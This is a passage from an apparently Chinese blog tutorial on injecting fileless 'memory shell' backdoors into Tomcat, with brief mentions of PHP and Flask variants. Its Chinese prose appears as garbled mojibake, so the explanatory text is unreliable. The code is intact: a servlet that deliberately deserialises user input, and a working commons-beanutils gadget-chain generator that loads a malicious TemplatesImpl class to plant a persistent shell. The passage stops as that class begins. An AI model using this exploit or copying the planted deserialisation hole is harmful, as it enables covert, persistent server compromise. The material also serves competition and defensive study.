æ‰§è¡Œæƒé™ï¼Œæ¯”å¦‚ç›®æ ‡å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„æƒ…å†µï¼Œæˆ‘ä»¬åˆè¯¥å¦‚ä½•åšåˆ°åœ¨ä¸ä¸Šä¼ jspçš„æ¡ä»¶ä¸‹ï¼Œå®Œæˆå†…å­˜é©¬çš„æ³¨å…¥ï¼Ÿå…¶å®éš¾ç‚¹åœ¨äºæˆ‘ä»¬è¯¥æ€æ ·è·å–requestå¯¹è±¡ã€‚è·å–requestå¯¹è±¡å¹¶ä¸ä»…ä»…æ˜¯ååºåˆ—åŒ–æ³¨å…¥å†…å­˜é©¬è¦è€ƒè™‘çš„ï¼Œåœ¨Java RCE Echoä¸­ï¼Œä¹Ÿæ˜¯é‡ä¸­ä¹‹é‡ã€‚æœ¬ç¯‡æ–‡ç« é‡ç‚¹ä»‹ç»<strong>é€šè¿‡ååºåˆ—åŒ–æ³¨å…¥å†…å­˜é©¬</strong>çš„æ–¹æ³•ã€‚ï¼ˆæœ¬ç¯‡æ–‡ç« é»˜è®¤è¯»è€…æ‹¥æœ‰åŸºç¡€çš„Tomcatã€JavaAgentä»¥åŠSpringæ¡†æ¶çŸ¥è¯†ï¼‰</p><p>PHPå†…å­˜é©¬æ˜¯<strong>é€šè¿‡ä¼ªé€ fastcgiåè®®åŒ…ä¸php-fpmè¿›è¡Œé€šä¿¡ï¼Œæ”¹å˜auto_prepend_fileé…ç½®ï¼Œä»è€Œåœ¨æ¯æ¬¡è®¿é—®æ­£å¸¸PHPæ–‡ä»¶æ—¶åŠ è½½æˆ‘ä»¬æ„é€ å¥½çš„phpé©¬</strong>ã€‚å› ä¸ºç¬”è€…å¹¶ä¸è®¤å¯PHPä¸æ­»é©¬æ˜¯ä¸€ç§å†…å­˜é©¬æŠ€æœ¯ï¼Œå› æ­¤åœ¨è¿™ç¯‡æ–‡ç« å°±ä¸åšå…·ä½“ä»‹ç»äº†ã€‚</p><p>Pythonå†…å­˜é©¬ï¼ŒåŸå‡ºè‡ªhexmanå­¦é•¿ä»‹ç»çš„ä¸€ç§æ–¹æ³•ï¼š<a href="https://github.com/iceyhexman/flask_memory_shell">Flask å†…å­˜é©¬</a>ï¼Œé€šè¿‡åˆ©ç”¨flask&#x2F;jinja2 SSTIæ¼æ´æ¥å®ç°å†…å­˜ä¿®æ”¹ï¼Œæ³¨å…¥å†…å­˜é©¬ã€‚<strong>ç½‘ä¸Šä¹Ÿæœ‰ä¸å°‘æ–‡ç« åœ¨ä»‹ç»è¿™ç§å†…å­˜é©¬ï¼Œç„¶è€Œä»…ä»…åªæ˜¯æ ¹æ®payloadæ¥è§£é‡Šï¼Œæ²¡æœ‰äººä»ä»£ç å±‚å»åˆ†æèƒ½å¤Ÿæ³¨å…¥å†…å­˜é©¬çš„åŸå› ï¼Œæœ¬ç¯‡æ–‡ç« ä¼šä»ä»£ç å±‚åˆ†æflaskçš„è¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶ï¼Œå¹¶æ ¹æ®æ³¨å…¥åŸç†ç»™å‡ºä¸€äº›payloadå˜å½¢ã€‚</strong>è™½ç„¶flask&#x2F;jinja2 SSTIæ¼æ´åœ¨çœŸå®åœºæ™¯ä¸­å¾ˆéš¾å‡ºç°ï¼Œä½†æ˜¯åœ¨ä¸€äº›AWDæ¯”èµ›ä¸Šå…³äºflask&#x2F;jinja2 SSTIæ¼æ´çš„é¢˜ç›®å´æ˜¯ç»å¸¸æœ‰ï¼Œä¸ºäº†èƒ½å¤Ÿåœ¨ç›®æ ‡ä¿®è¡¥SSTIæ¼æ´åç»´æŒæƒé™ï¼Œè¿™ç§å†…å­˜é©¬ä¹Ÿæ˜¯å¾ˆå€¼å¾—å­¦ä¸€å­¦çš„ã€‚</p><h2 id="Java-å†…å­˜é©¬"><a href="#Java-å†…å­˜é©¬" class="headerlink" title="Java å†…å­˜é©¬"></a>Java å†…å­˜é©¬</h2><p>ç¬”è€…Tomcatçš„ç‰ˆæœ¬æ˜¯9.0.76ï¼Œä¸åŒçš„Tomcatç‰ˆæœ¬å¯èƒ½ä¼šæœ‰æ‰€å·®å¼‚ï¼Œè¯·æ³¨æ„ã€‚</p><h3 id="Tomcat-Servlet-å‹å†…å­˜é©¬"><a href="#Tomcat-Servlet-å‹å†…å­˜é©¬" class="headerlink" title="Tomcat-Servlet å‹å†…å­˜é©¬"></a>Tomcat-Servlet å‹å†…å­˜é©¬</h3><h4 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h4><p>é¦–å…ˆé…ç½®ä¸€ä¸ªæœ€ç®€å•çš„Servletï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;, loadOnStartup = 2)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„å†™loadOnStartup&#x3D;2æ˜¯ä¸ºäº†åé¢çš„è°ƒè¯•æ›´å¥½ç†è§£ã€‚æ¥ç€å¯¼å…¥tomcat-catalinaä¾èµ–ï¼Œåº”ä¸è‡ªå·±çš„tomcatç‰ˆæœ¬ä¸€è‡´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;9.0.76&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>åœ¨org.apache.catalina.startup.ContextConfig#configureContextå¤„æ‰“ä¸‹æ–­ç‚¹ï¼Œå¼€å§‹è°ƒè¯•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26ce71ddac507cc0273ea.jpg" title="image-20230802150054993" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26ce71ddac507cc0273ea.jpg" alt="image-20230802150054993"></a></p><p>å› ä¸ºæˆ‘ä»¬æ˜¯é‡‡ç”¨æ³¨è§£çš„æ–¹å¼é…ç½®Servletï¼Œå› æ­¤æ­¤å¤„æˆ‘ä»¬ä»ç„¶å¯ä»¥è·å–åˆ°åˆ›å»ºçš„Servletã€‚é¦–å…ˆæ˜¯DefalutServletä»¥åŠJspServletï¼Œæ¥ç€å°±éå†åˆ°äº†æˆ‘ä»¬åˆ›å»ºçš„HelloServletäº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26cf91ddac507cc02a3c2.jpg" title="image-20230802150539325" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26cf91ddac507cc02a3c2.jpg" alt="image-20230802150539325"></a></p><p>ä¹‹åæ‰§è¡Œ<code>this.context.createWrapper()</code>åˆ›å»ºWrapperï¼ŒWrapper è¡¨ç¤ºä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ª Servlet çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d051ddac507cc02c10d.jpg" title="image-20230802150700866" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d051ddac507cc02c10d.jpg" alt="image-20230802150700866"></a></p><p>å¯ä»¥çœ‹åˆ°this.contextæ˜¯ä¸€ä¸ªStandardContextå¯¹è±¡ã€‚é‚£æˆ‘ä»¬ç»§ç»­è°ƒè¯•çœ‹çœ‹å¯¹Wrapperè¿›è¡Œäº†å“ªäº›æ“ä½œï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d121ddac507cc02e18f.jpg" title="image-20230802150947572" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d121ddac507cc02e18f.jpg" alt="image-20230802150947572"></a></p><p>é¦–å…ˆè·å–Servletçš„LoadOnStartupå’Œenabledï¼Œå¹¶è®¾ç½®ç»™Wrapperã€‚å…¶ä¸­LoadOnStartupå°±æ˜¯æˆ‘ä»¬åœ¨æ³¨è§£ä¸­é…ç½®çš„å‚æ•°ï¼Œå®ƒè¡¨ç¤ºservletè¢«åŠ è½½çš„å…ˆåé¡ºåºã€‚ç»§ç»­è·Ÿè¿›ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d1e1ddac507cc0302e9.jpg" title="image-20230802151328144" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d1e1ddac507cc0302e9.jpg" alt="image-20230802151328144"></a></p><p>è¿™é‡Œè°ƒç”¨äº†Servletçš„getServletName()æ–¹æ³•ï¼Œè·å–servletçš„åå­—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨ä¸»æœºä¸­é…ç½®çš„nameå‚æ•°çš„å€¼ï¼Œæ¥ç€å°†nameçš„å€¼è®¾ç½®ç»™Wrapperã€‚æ¥ç€è¿˜å°†<code>servlet.getRunAs()</code>çš„ç»“æœä¼ å…¥ç»™äº†Wrapperï¼Œä¸è¿‡å› ä¸ºæ­¤å¤„<code>servlet.getRunAs()</code>çš„æ‰§è¡Œç»“æœæ˜¯nullä¸”<code>roleRefs.size()==0</code>ï¼Œå› æ­¤æ­¤å¤„æˆ‘ä»¬å¯ä»¥å¿½ç•¥ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d2d1ddac507cc032929.jpg" title="image-20230802151705189" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d2d1ddac507cc032929.jpg" alt="image-20230802151705189"></a></p><p>ç»§ç»­è·Ÿè¿›ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d371ddac507cc034661.jpg" title="image-20230802151854696" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d371ddac507cc034661.jpg" alt="image-20230802151854696"></a></p><p>å¯ä»¥çœ‹åˆ°æ­¤å¤„å°†Wrapperçš„servletClassè®¾ç½®ä¸ºHelloServletçš„å…¨é™å®šåã€‚ç»§ç»­è·Ÿè¿›ï¼Œå› ä¸ºServletçš„multipartDef&#x3D;&#x3D;nullã€asyncSupported&#x3D;&#x3D;nullï¼Œå› æ­¤ä»¥ä¸‹éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥è·³è¿‡ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d441ddac507cc036932.jpg" title="image-20230802152617852" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d441ddac507cc036932.jpg" alt="image-20230802152617852"></a></p><p>ä¹‹ååˆæ‰§è¡Œäº†addChildæ–¹æ³•å°†è¿™ä¸ªWrapperæ·»åŠ è¿›äº†StandardContextä¸­ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d511ddac507cc0388e7.jpg" title="image-20230802152732881" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d511ddac507cc0388e7.jpg" alt="image-20230802152732881"></a></p><p>æ¥ä¸‹æ¥æ·»åŠ Servlet-Mapperï¼Œä¹Ÿå°±æ˜¯web.xmlä¸­çš„<code>&lt;servlet-mapping&gt;</code>ï¼Œä¸è¿‡å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡æ³¨è§£è®¾ç½®urlå’Œservletçš„æ˜ å°„å…³ç³»ï¼Œå› æ­¤æ­¤å¤„æ˜¯é€šè¿‡æ³¨è§£è·å–è€Œéweb.xmlã€‚æ¥ç€å¾ªç¯addServletMappingDecodedå°†urlå’Œservletç±»åšæ˜ å°„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d5e1ddac507cc03acd7.jpg" title="image-20230802153045780" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d5e1ddac507cc03acd7.jpg" alt="image-20230802153045780"></a></p><p>è‡³æ­¤æˆ‘ä»¬å°±çœ‹å®Œäº†servletçš„æ³¨å†Œæµç¨‹ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªç–‘é—®ï¼Œé‚£å°±æ˜¯è¿™ä¸ªStandardContextä»å“ªé‡Œè·å–ï¼Ÿ</p><p>å…¶å®è¿™ä¸ªåˆ†ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯ç½‘ä¸Šå¾ˆå¸¸è§çš„ï¼Œå°†å†…å­˜é©¬çš„ç”Ÿæˆä»£ç å†™å…¥åˆ°jspå¹¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œæ¥ç€è®¿é—®è¯¥jspç„¶åæ³¨å…¥å†…å­˜é©¬ï¼Œè¿™ç§æ–¹æ³•è·å–StandardContextæ¯”è¾ƒå®¹æ˜“ï¼Œå› ä¸ºjspå†…ç½®requestå¯¹è±¡ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åˆ©ç”¨requestå¯¹è±¡åå°„è·å–ã€‚ä½†æ˜¯è¿™ç§æƒ…å†µè¦æ±‚æ–‡ä»¶è½åœ°ï¼Œå¾ˆå®¹æ˜“è¢«æ£€æµ‹åˆ°ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯é€šè¿‡æŸäº›gadget chainï¼ˆå¦‚CC11ï¼ŒCB1ï¼‰æ‰“å…¥å­—èŠ‚ç ï¼Œç„¶åæ³¨å…¥å†…å­˜é©¬ã€‚è¿™ç§æƒ…å†µéœ€è¦æˆ‘ä»¬çŸ¥é“requestå­˜å‚¨çš„ä½ç½®ï¼Œè·å–åˆ°requestå¯¹è±¡åé€šè¿‡åå°„è·å–StandardContextã€‚ç¬¬äºŒç§æƒ…å†µæ›´éšè”½ï¼Œä½†åŒæ—¶è¦æ±‚å’Œéš¾åº¦æ›´å¤§ï¼Œè¿™é‡Œå¯¹ä¸¤ç§æ–¹æ³•éƒ½è¿›è¡Œä»‹ç»ã€‚</p><h4 id="ååºåˆ—åŒ–æ³¨å…¥Tomcat-Servletå‹å†…å­˜é©¬"><a href="#ååºåˆ—åŒ–æ³¨å…¥Tomcat-Servletå‹å†…å­˜é©¬" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥Tomcat-Servletå‹å†…å­˜é©¬"></a>ååºåˆ—åŒ–æ³¨å…¥Tomcat-Servletå‹å†…å­˜é©¬</h4><p>æ·»åŠ commons-beanutilsä¾èµ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.9.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>å¹¶ä¿®æ”¹HelloServletçš„doPostæ–¹æ³•ï¼Œæˆ‘ä»¬æ‰‹åŠ¨æ„é€ ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ç¯å¢ƒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;codes&quot;</span>);</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">        <span class="type">byte</span>[] codebytes = Base64.getDecoder().decode(codes);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(codebytes));</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException c)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;ååºåˆ—åŒ–æˆåŠŸï¼&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–æ³¨å…¥å†…å­˜é©¬è·å–requestå¯¹è±¡çš„æ–¹æ³•ï¼Œæˆ‘è¿™é‡Œæä¾›ä¸¤ç§ã€‚ä¸€ç§æ˜¯<strong>kingkk</strong>å¸ˆå‚…æå‡ºçš„ï¼š</p><blockquote><p>1ã€åå°„ä¿®æ”¹<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code></p><p>2ã€åˆå§‹åŒ–<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>ä¸¤ä¸ªå˜é‡ï¼Œé»˜è®¤ä¸ºnull</p><p>3ã€ä»<code>lastServicedResponse</code>ä¸­è·å–å½“å‰è¯·æ±‚responseï¼Œå¹¶ä¸”å›æ˜¾å†…å®¹ã€‚</p></blockquote><p>è¿™ç§æ–¹æ³•ç¼ºç‚¹æ˜¯åªä½¿ç”¨äºTomcatï¼Œä½†ä¼˜ç‚¹æ˜¯è€—æ—¶æ›´çŸ­ï¼Œè·å–requestæ›´ç¨³å®šã€‚å¦ä¸€ç§æ˜¯<strong>c0ny1</strong>å¸ˆå‚…æå‡ºçš„é€šè¿‡Thread.currentThread()æˆ–Thread.getThreads()è·å–ï¼š</p><blockquote><p>æŒ‰ç…§ç»éªŒæ¥è®²Webä¸­é—´ä»¶æ˜¯å¤šçº¿ç¨‹çš„åº”ç”¨ï¼Œä¸€èˆ¬requstå¯¹è±¡éƒ½ä¼šå­˜å‚¨åœ¨çº¿ç¨‹å¯¹è±¡ä¸­ï¼Œå¯ä»¥é€šè¿‡<code>Thread.currentThread()</code>æˆ–<code>Thread.getThreads()</code>è·å–ã€‚å½“ç„¶å…¶ä»–å…¨å±€å˜é‡ä¹Ÿæœ‰å¯èƒ½ï¼Œè¿™å°±éœ€è¦å»çœ‹å…·ä½“ä¸­é—´ä»¶çš„æºç äº†ã€‚æ¯”å¦‚å‰æ®µæ—¶é—´å…ˆçŸ¥ä¸Šçš„æä¸‰å¸ˆå‚…é€šè¿‡æŸ¥çœ‹ä»£ç ï¼Œå‘ç°<code>[MBeanServer](https://xz.aliyun.com/t/7535)</code>ä¸­ä¹Ÿæœ‰requestå¯¹è±¡ã€‚</p></blockquote><p>è¿™ç§æ–¹æ³•çš„ä¼˜ç‚¹æ˜¯æ›´åŠ é€šç”¨ï¼Œåœ¨å¤šç§Webä¸­é—´ä»¶ä¸­éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†ç¼ºç‚¹æ˜¯è€—æ—¶ç¨é•¿ï¼Œä¸”æœ‰æ—¶å€™ä¼šå‡ºç°æ²¡æœ‰æœç´¢åˆ°requestå¯¹è±¡çš„æƒ…å†µã€‚å‡ºç°é¦–å…ˆç»™å‡ºç¬¬ä¸€ç§æ–¹æ³•çš„EXPï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯CB1ååºåˆ—åŒ–æ‰€éœ€è¦çš„æ¶æ„æ¨¡æ¿ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 